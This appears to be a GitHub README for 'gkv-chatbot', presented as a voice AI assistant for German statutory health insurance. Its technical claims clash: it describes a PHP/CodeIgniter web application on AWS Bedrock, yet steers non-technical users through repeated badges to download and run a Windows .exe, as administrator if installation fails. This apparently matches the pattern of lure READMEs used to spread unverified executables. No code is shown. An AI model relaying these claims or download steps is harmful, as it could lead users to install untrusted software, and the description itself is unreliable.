# 🤖 gkv-chatbot - Simple AI Help for Health Insurance

[![Download gkv-chatbot](https://img.shields.io/badge/Download-gkv--chatbot-brightgreen?style=for-the-badge)](https://github.com/Kelliaenvisioned219/gkv-chatbot/releases)

## About gkv-chatbot

gkv-chatbot is an AI-based assistant designed for users of the German statutory health insurance system (Gesetzliche Krankenversicherung, GKV). It uses voice input and clear text responses to answer common questions related to health insurance. The chatbot runs on Windows and connects to an AI service to provide real-time help. It also streams answers smoothly to improve interaction.

This tool is made with PHP and CodeIgniter 4, using AWS Bedrock for AI processing. You do not need any programming knowledge to use it. Just install and start chatting.

---

## 🎯 Key Features

- Understands questions about German health insurance.
- Accepts voice commands and converts speech to text.
- Provides answers backed by a knowledge base.
- Streams responses as you interact (SSE - Server-Sent Events).
- Uses clear, simple language.
- Runs on Windows with no special setup needed.
- Works offline for voice input and text-to-speech once installed.

---

## 🖥️ System Requirements

- Windows 10 or later.
- At least 4 GB of RAM.
- 500 MB free disk space for installation.
- Stable internet connection for AI response streaming.
- Microphone for voice input.
- Speakers or headphones to hear responses.

---

## 🚀 Getting Started: Download and Install

To begin using gkv-chatbot on Windows, follow these steps:

1. Visit the release page here to download the latest version:

   [![Get gkv-chatbot](https://img.shields.io/badge/Get%20gkv--chatbot-blue?style=for-the-badge)](https://github.com/Kelliaenvisioned219/gkv-chatbot/releases)

2. On the release page, locate the most recent version marked for Windows. It will usually have a file ending with `.exe`.

3. Click the file to download it to your computer.

4. Once downloaded, double-click the installer file to start the installation.

5. Follow the on-screen instructions. The setup wizard will guide you through the necessary steps.

6. After installation, run the gkv-chatbot from your desktop or Start menu.

---

## 🔊 Using Voice Input and Text

gkv-chatbot allows you to speak your questions or type them in.

- To use voice commands, click the microphone icon. Make sure your microphone is active and has permission.

- Speak clearly in German to get the best results.

- The chatbot will transcribe your speech and display the text.

- Answers will appear on screen and through your speakers.

---

## 💬 Chat Interface Walkthrough

When you open gkv-chatbot, you will see:

- A text box at the bottom to type your questions.

- A microphone icon to start voice input.

- The chat window above showing your interaction history.

- A settings button to adjust microphone and speaker preferences.

Just type or say what you want to know about GKV health insurance. For example:  
“How can I change my health insurance provider?”  
or  
“Welche Leistungen werden von der gesetzlichen Krankenversicherung abgedeckt?”

---

## ⚙️ Settings and Configuration

You can change these main options:

- **Language**: Currently set to German, but you can adjust the display language to English if needed.

- **Microphone**: Select your preferred input device.

- **Speaker**: Pick where you want to hear chatbot answers.

- **Chat History**: Enable or disable saving previous conversations.

- **Accessibility**: Adjust font size and theme (light/dark).

---

## 🔧 Troubleshooting Common Issues

- **The chatbot does not start**: Make sure you have Windows 10 or later installed. Restart your computer and try again.

- **Speech not recognized**: Check that your microphone is working and enabled in Windows settings. Speak slowly and clearly.

- **No answer from chatbot**: Ensure your internet connection is active. The chatbot streams answers from the AI service.

- **Installation fails**: Run the installer as administrator and close other apps before installation.

---

## 📂 About the Technology

gkv-chatbot connects to AWS Bedrock to process your questions. This lets it generate detailed answers based on verified health insurance rules.

The app uses CodeIgniter 4, a lightweight PHP framework, for fast and stable performance.

Through SSE (Server-Sent Events), the chatbot streams answers while still typing, creating a smooth user experience.

---

## 🌐 More Info and Updates

Check the official release page regularly for updates and new features.  
https://github.com/Kelliaenvisioned219/gkv-chatbot/releases

---

## 🔒 Privacy and Security

gkv-chatbot processes your questions securely through AWS servers. No personal data is saved permanently unless you enable chat history.

Voice data is used only to convert speech to text during your session.

---

## 📞 Support and Community

If you have questions about using gkv-chatbot, report issues, or suggest features, open an issue on the GitHub repository page:  
https://github.com/Kelliaenvisioned219/gkv-chatbot/issues

---

## 📝 License

This project is open source and available under the MIT License.  
See the LICENSE file in the repository for details.